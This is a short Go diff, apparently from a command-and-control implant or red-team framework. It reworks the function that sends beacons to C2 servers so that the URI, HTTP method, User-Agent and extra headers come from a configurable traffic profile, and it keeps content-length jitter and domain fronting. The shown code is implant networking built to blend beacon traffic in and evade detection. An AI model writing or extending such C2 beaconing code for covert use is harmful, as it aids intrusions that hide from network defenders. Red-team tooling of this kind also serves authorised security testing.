@@ -1021,17 +1021,27 @@ func sendToC2(idx int, body []byte) []byte {
 	}
 	url := C2URLs[idx]
 
-	beaconURI := BeaconURI
+	beaconURI := getActiveBeaconURIFromConfig()
 	if ContentLengthJitter > 0 {
 		beaconURI = addRandomParam(beaconURI)
 	}
 
-	req, err := http.NewRequest("POST", url+beaconURI, bytes.NewReader(body))
+	method := getActiveBeaconMethodFromConfig()
+	if method == "" {
+		method = "POST"
+	}
+	req, err := http.NewRequest(method, url+beaconURI, bytes.NewReader(body))
 	if err != nil {
 		return nil
 	}
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", UserAgent)
+	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
+	for k, v := range getActiveHeaders() {
+		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
+			continue
+		}
+		req.Header.Set(k, v)
+	}
 
 	if DomainFront != "" {
 		req.Host = DomainFront
